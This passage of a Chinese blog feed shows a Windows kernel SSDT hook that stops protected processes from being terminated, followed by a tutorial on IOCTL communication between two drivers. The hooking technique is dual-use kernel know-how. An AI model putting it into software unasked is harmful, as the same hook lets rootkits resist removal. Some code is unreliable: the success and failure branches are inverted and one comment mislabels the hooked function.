class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="comment">// 函数名称 : HookNtTerminateProcess</span></span><br><span class="line"><span class="comment">// 描    述 : 自定义的 NtOpenProcess，用来实现 Hook Kernel API</span></span><br><span class="line"><span class="comment">// 日    期 : 2013/06/28</span></span><br><span class="line"><span class="comment">// 参    数 : ProcessHandle:进程句柄 ExitStatus:</span></span><br><span class="line"><span class="comment">// 返 回 值 : </span></span><br><span class="line"><span class="comment">//************************************</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">HookNtTerminateProcess</span><span class="params">(__in_opt HANDLE ProcessHandle,__in NTSTATUS ExitStatus)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG uPID;</span><br><span class="line">    NTSTATUS rtStatus;</span><br><span class="line">    PCHAR pStrProcName;</span><br><span class="line">    PEPROCESS pEProcess;</span><br><span class="line">    ANSI_STRING strProcName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过进程句柄来获得该进程所对应的 FileObject 对象，由于这里是进程对象，自然获得的是 EPROCESS 对象</span></span><br><span class="line">    rtStatus = <span class="built_in">ObReferenceObjectByHandle</span>(ProcessHandle, FILE_READ_DATA, <span class="literal">NULL</span>, KernelMode, (PVOID*)&amp;pEProcess, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(rtStatus))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> rtStatus;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存 SSDT 中原来的 NtTerminateProcess 地址</span></span><br><span class="line">    pOldNtTerminateProcess = (NTTERMINATEPROCESS)oldSysServiceAddr[<span class="built_in">SYSCALL_INDEX</span>(ZwTerminateProcess)];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过该函数可以获取到进程名称和进程 ID，该函数在内核中实质是导出的(在 WRK 中可以看到)</span></span><br><span class="line">    <span class="comment">// 但是 ntddk.h 中并没有到处，所以需要自己声明才能使用</span></span><br><span class="line">    uPID = (ULONG)<span class="built_in">PsGetProcessId</span>(pEProcess);</span><br><span class="line">    pStrProcName = _strupr((TCHAR *)<span class="built_in">PsGetProcessImageFileName</span>(pEProcess));<span class="comment">//使用微软未公开的PsGetProcessImageFileName函数获取进程名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过进程名来初始化一个 ASCII 字符串</span></span><br><span class="line">    <span class="built_in">RtlInitAnsiString</span>(&amp;strProcName, pStrProcName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">ValidateProcessNeedProtect</span>(uPID) != <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 确保调用者进程能够结束(这里主要是指 taskmgr.exe)</span></span><br><span class="line">        <span class="keyword">if</span> (uPID != (ULONG)<span class="built_in">PsGetProcessId</span>(<span class="built_in">PsGetCurrentProcess</span>()))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果该进程是所保护的的进程的话，则返回权限不够的异常即可</span></span><br><span class="line">            <span class="keyword">return</span> STATUS_ACCESS_DENIED;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对于非保护的进程可以直接调用原来 SSDT 中的 NtTerminateProcess 来结束进程</span></span><br><span class="line">    rtStatus = <span class="built_in">pOldNtTerminateProcess</span>(ProcessHandle, ExitStatus);</span><br><span class="line">    <span class="keyword">return</span> rtStatus;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用IO控制码进行通信</title>
      <link href="/2024/02/06/%E4%BD%BF%E7%94%A8IO%E6%8E%A7%E5%88%B6%E7%A0%81%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1/"/>
      <url>/2024/02/06/%E4%BD%BF%E7%94%A8IO%E6%8E%A7%E5%88%B6%E7%A0%81%E8%BF%9B%E8%A1%8C%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="使用IO控制码进行驱动间通信"><a href="#使用IO控制码进行驱动间通信" class="headerlink" title="使用IO控制码进行驱动间通信"></a>使用IO控制码进行驱动间通信</h1><p><img src="/.io//image-20240206155604226.png" alt="image-20240206155604226"></p><p>驱动对象用DRIVER_OBJECT数据结构表示，它作为驱动的一个实例被内核加载，并且内核对一个驱动只加 载一个实例。确切地说，是由内核中的I&#x2F;O管理器负责加载的。</p><p><img src="/.io//image-20240206160545671.png" alt="image-20240206160545671"></p><p>每个驱动程序会创建一个或多个设备对象，用DEVICE_OBJECT数据结构表示。每个设备对象都会有一个指 针指向下一个设备对象，因此就形成一个设备链。设备链的第一个设备是由上一节介绍的DRIVER_OBJECT 结构体中指明的。设备对象保存设备特征和状态的信息。</p><p><img src="/.io//image-20240206160842444.png" alt="image-20240206160842444"></p><h2 id="DriverA（Server）"><a href="#DriverA（Server）" class="headerlink" title="DriverA（Server）"></a>DriverA（Server）</h2><h3 id="定义IO控制码"><a href="#定义IO控制码" class="headerlink" title="定义IO控制码"></a>定义IO控制码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800 <span class="comment">// 定义了IO控制码的基础值，确保IO控制码唯一</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_CODE1(i)\</span></span><br><span class="line"><span class="meta">    CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_IN_DIRECT,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_CODE2(i)\</span></span><br><span class="line"><span class="meta">    CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_OUT_DIRECT,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_IRP_READ     IOCTRL_CODE1(1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_IRP_WRITE    IOCTRL_CODE2(2)</span></span><br></pre></td></tr></table></figure><p>CTL_CODE(DeviceType, Function, Method, Access)</p><ul><li><strong>DeviceType</strong>：指定设备类型。在这里使用<code>FILE_DEVICE_UNKNOWN</code>，意味着设备类型未知或不重要。</li><li><strong>Function</strong>：提供功能码，与<code>IOCTRL_BASE</code>相加用于生成特定的控制码。</li><li><strong>Method</strong>：指定数据传输方法。这里使用<code>METHOD_IN_DIRECT</code>和<code>METHOD_OUT_DIRECT</code>，分别用于输入和输出操作，其中直接I&#x2F;O允许数据在用户空间和内核空间之间直接传输，减少拷贝开销。</li><li><strong>Access</strong>：定义访问权限。这里使用<code>FILE_ANY_ACCESS</code>，表示任何人都可以访问该控制码。</li></ul><h3 id="进行通信（DriverEntry调用）"><a href="#进行通信（DriverEntry调用）" class="headerlink" title="进行通信（DriverEntry调用）"></a>进行通信（DriverEntry调用）</h3><ol><li>初始化和获取设备对象</li></ol><ul><li>首先，函数初始化状态变量<code>Status</code>为<code>STATUS_UNSUCCESSFUL</code>，并准备输入输出缓冲区。</li><li>使用<code>IoGetDeviceObjectPointer</code>根据设备名称获取设备对象（<code>DeviceObject</code>）和文件对象（<code>FileObject</code>）。这一步是必要的，因为后续操作需要这些对象来构建IRP（I&#x2F;O请求包）。</li></ul><ol start="2"><li>构建和发送IRP</li></ol><ul><li>函数通过<code>IoBuildDeviceIoControlRequest</code>构建一个设备IO控制请求的IRP，指定IO控制代码（在这里是<code>DEVICE_IRP_READ</code>），输入输出缓冲区，以及一个事件对象<code>Event</code>用于同步操作。</li><li>在IRP的堆栈位置中设置文件对象，这对于设备驱动处理IRP时可能是必需的。</li><li>调用<code>IoCallDriver</code>将IRP发送给设备驱动。</li></ul><ol start="3"><li>等待操作完成</li></ol><ul><li>如果<code>IoCallDriver</code>返回值表示操作未立即成功完成，代码使用<code>KeWaitForSingleObject</code>等待之前创建的事件被设备驱动信号化。这表示操作已完成。</li><li>完成后，通过<code>DbgPrint</code>打印调试信息和操作结果。</li></ul><ol start="4"><li>清理资源</li></ol><ul><li>在操作完成后，使用<code>ObDereferenceObject</code>减少文件对象的引用计数。注意，不需要为设备对象做这一步，因为<code>IoGetDeviceObjectPointer</code>只增加了文件对象的引用计数。</li></ul><p>由于函数立即返回，NTSTAUS一般是失败的。可以使用GetLastError继续判断。操作完成的标准是KEVENT事件授信。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR InputBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR OutputBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PFILE_OBJECT FileObject;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//构建设备名字</span></span><br><span class="line">        UNICODE_STRING DeviceName = <span class="built_in">RTL_CONSTANT_STRING</span>(<span class="string">L&quot;\\device\\DriverB&quot;</span>);   <span class="comment">//字符串转换至Unicode中</span></span><br><span class="line">        <span class="comment">//根据设备名字获取实际的设备对象和文件对象,等价于直接调用</span></span><br><span class="line">        <span class="comment">//CreateFile(返回的句柄可以通过句柄找对象方式获得设备对象和文件对象)</span></span><br><span class="line">        Status = <span class="built_in">IoGetDeviceObjectPointer</span>(&amp;DeviceName, FILE_ALL_ACCESS, &amp;FileObject, &amp;DeviceObject);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//申请 IRP接口 生成DeviceIoControl 类型的Irp请求</span></span><br><span class="line">        LARGE_INTEGER offset = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        KEVENT Event = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">KeInitializeEvent</span>(&amp;Event, SynchronizationEvent, FALSE);</span><br><span class="line">        <span class="type">size_t</span> InputSize = (<span class="built_in">wcslen</span>(<span class="string">L&quot;[A]--DEVICE_IRP_READ --&gt;我要开始读取了&quot;</span>) + <span class="number">1</span>) * <span class="number">2</span>;   <span class="comment">//发送数据的长度</span></span><br><span class="line">        <span class="built_in">RtlStringCbCopyNW</span>(InputBuffer, <span class="built_in">sizeof</span>(InputBuffer), <span class="string">L&quot;[A]--DEVICE_IRP_READ --&gt;我要开始读取了&quot;</span>, InputSize);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        PIRP Irp = <span class="built_in">IoBuildDeviceIoControlRequest</span>(</span><br><span class="line">            DEVICE_IRP_READ,   <span class="comment">//判断请求码</span></span><br><span class="line">            DeviceObject,</span><br><span class="line">            InputBuffer,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            OutputBuffer,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            FALSE,</span><br><span class="line">            &amp;Event,</span><br><span class="line">            &amp;IoStatusBlock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        PIO_STACK_LOCATION IoStackLocation = <span class="built_in">IoGetNextIrpStackLocation</span>(Irp);   <span class="comment">//获取当前的Irp堆栈</span></span><br><span class="line">        IoStackLocation-&gt;FileObject = FileObject;</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">        <span class="comment">//函数立马返回</span></span><br><span class="line">        Status = <span class="built_in">IoCallDriver</span>(DeviceObject, Irp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 模拟调用 DeviceIoControl 成功\r\n&quot;</span>);</span><br><span class="line">            <span class="comment">//采用无限等待方式进行等待</span></span><br><span class="line">            <span class="built_in">KeWaitForSingleObject</span>(&amp;Event, Executive, KernelMode, FALSE, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 数据读取完成\r\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A] --&gt; read value is %ws \r\n&quot;</span>, OutputBuffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 模拟调用 DeviceIoControl 失败\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">ObDereferenceObject</span>(FileObject); <span class="comment">//减少引用,不需要解除Deviceobj, IoGetDeviceObjectPointer规定</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样测试Write控制码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Sub_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR InputBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR OutputBuffer[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PFILE_OBJECT FileObject;</span><br><span class="line">    PDEVICE_OBJECT DeviceObject;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      </span><br><span class="line">        <span class="comment">//构建设备名字</span></span><br><span class="line">        UNICODE_STRING DeviceName = <span class="built_in">RTL_CONSTANT_STRING</span>(<span class="string">L&quot;\\device\\DriverB&quot;</span>);</span><br><span class="line">        <span class="comment">//根据设备名字获取实际的设备对象和文件对象,等价于直接调用</span></span><br><span class="line">        <span class="comment">//CreateFile(返回的句柄可以通过句柄找对象方式获得设备对象和文件对象)</span></span><br><span class="line">        Status = <span class="built_in">IoGetDeviceObjectPointer</span>(&amp;DeviceName, FILE_ALL_ACCESS, &amp;FileObject, &amp;DeviceObject);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//3.申请 IRP接口 生成DeviceIoControl 类型的Irp请求</span></span><br><span class="line">        LARGE_INTEGER offset = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        KEVENT Event = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        <span class="built_in">KeInitializeEvent</span>(&amp;Event, SynchronizationEvent, FALSE);</span><br><span class="line">        <span class="type">size_t</span> InputSize= (<span class="built_in">wcslen</span>(<span class="string">L&quot;[A]--DEVICE_WRITE --&gt;我要开始读取了&quot;</span>) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">RtlStringCbCopyNW</span>(InputBuffer, <span class="built_in">sizeof</span>(InputBuffer), <span class="string">L&quot;[A]--DEVICE_IRP_WRITE --&gt;我要开始读取了&quot;</span>, InputSize);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//向目标驱动的IRP_MJ_DEVICE_CONTROL</span></span><br><span class="line">        PIRP Irp = <span class="built_in">IoBuildDeviceIoControlRequest</span>(</span><br><span class="line">            DEVICE_IRP_WRITE,    <span class="comment">//子功能码</span></span><br><span class="line">            DeviceObject,</span><br><span class="line">            InputBuffer,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            OutputBuffer,</span><br><span class="line">            <span class="number">100</span>,</span><br><span class="line">            FALSE,</span><br><span class="line">            &amp;Event,</span><br><span class="line">            &amp;IoStatusBlock);  </span><br><span class="line"></span><br><span class="line">        PIO_STACK_LOCATION IoStackLocation = <span class="built_in">IoGetNextIrpStackLocation</span>(Irp);</span><br><span class="line">        IoStackLocation-&gt;FileObject = FileObject;</span><br><span class="line">        Status = <span class="built_in">IoCallDriver</span>(DeviceObject, Irp);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 模拟调用 DeviceIoControl 成功\r\n&quot;</span>);</span><br><span class="line">            <span class="comment">//采用无限等待方式进行等待</span></span><br><span class="line">            <span class="built_in">KeWaitForSingleObject</span>(&amp;Event, Executive, KernelMode, FALSE, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 数据读取完成\r\n&quot;</span>);</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A] --&gt; read value is %ws \r\n&quot;</span>, OutputBuffer);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DbgPrint</span>(<span class="string">&quot;[A]---&gt; 模拟调用 DeviceIoControl 失败\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ObDereferenceObject</span>(FileObject); <span class="comment">//减少引用,不需要解除Deviceobj, IoGetDeviceObjectPointer规定</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>DriverUnload不需要做任何操作。但需要定义。</p><h2 id="DriverB（Client）"><a href="#DriverB（Client）" class="headerlink" title="DriverB（Client）"></a>DriverB（Client）</h2><p>需要做好一样的定义。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_CODE1(i)\</span></span><br><span class="line"><span class="meta">    CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_IN_DIRECT,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_CODE2(i)\</span></span><br><span class="line"><span class="meta">    CTL_CODE(FILE_DEVICE_UNKNOWN,IOCTRL_BASE+i,METHOD_OUT_DIRECT,FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_IRP_READ     IOCTRL_CODE1(1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_IRP_WRITE    IOCTRL_CODE2(2)</span></span><br></pre></td></tr></table></figure><h3 id="DriverEntry"><a href="#DriverEntry" class="headerlink" title="DriverEntry"></a>DriverEntry</h3><ol><li>创建驱动设备对象</li><li>所有MajorFunction初始化为默认派遣例程</li><li>IRP_MJ_DEVICE_CONTROL关联IoDispatchControl</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN PDRIVER_OBJECT DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">IN PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注册其他驱动调用函数入口</span></span><br><span class="line">DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="comment">//创建驱动设备对象</span></span><br><span class="line">    Status = <span class="built_in">CreateDevice</span>(DriverObject);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; IRP_MJ_MAXIMUM_FUNCTION;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        DriverObject-&gt;MajorFunction[i] = PassThroughDispatch;   <span class="comment">//默认派遣历程</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IoDispatchControl;   <span class="comment">//主功能码与函数的关联</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建驱动设备对象"><a href="#创建驱动设备对象" class="headerlink" title="创建驱动设备对象"></a>创建驱动设备对象</h3><ol><li>使用<code>UNICODE_STRING</code>结构和<code>RtlInitUnicodeString</code>函数初始化设备名称为<code>\\Device\\DriverB</code>。这个名称在内核命名空间中唯一标识了驱动程序创建的设备。</li><li>调用<code>IoCreateDevice</code>函数创建设备对象。这个函数需要驱动程序对象、设备名称、设备类型（这里为<code>FILE_DEVICE_UNKNOWN</code>），以及是否独占访问（这里为<code>TRUE</code>）等参数。</li><li>设定<code>DeviceObject</code>的<code>Flags</code>属性，启用直接I&#x2F;O（<code>DO_DIRECT_IO</code>）。这意味着数据传输将直接在用户缓冲区和设备之间进行，而不是使用中间缓冲区。</li><li>初始化符号链接名称为<code>\\??\\DriverB</code>，然后调用<code>IoCreateSymbolicLink</code>函数创建从符号链接到设备对象的映射。这样，用户模式应用程序可以通过符号链接访问设备。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">CreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">IN PDRIVER_OBJECTDriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTSTATUS Status;</span><br><span class="line">PDEVICE_OBJECT DeviceObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备名称</span></span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\DriverB&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建设备</span></span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject,<span class="literal">NULL</span>,</span><br><span class="line">&amp;DeviceName,</span><br><span class="line">FILE_DEVICE_UNKNOWN,</span><br><span class="line"><span class="number">0</span>, TRUE,</span><br><span class="line">&amp;DeviceObject);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line"></span><br><span class="line">DeviceObject-&gt;Flags |= DO_DIRECT_IO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建符号链接</span></span><br><span class="line">UNICODE_STRING LinkName;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;LinkName, <span class="string">L&quot;\\??\\DriverB&quot;</span>);</span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;LinkName, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line"><span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IO派遣例程"><a href="#IO派遣例程" class="headerlink" 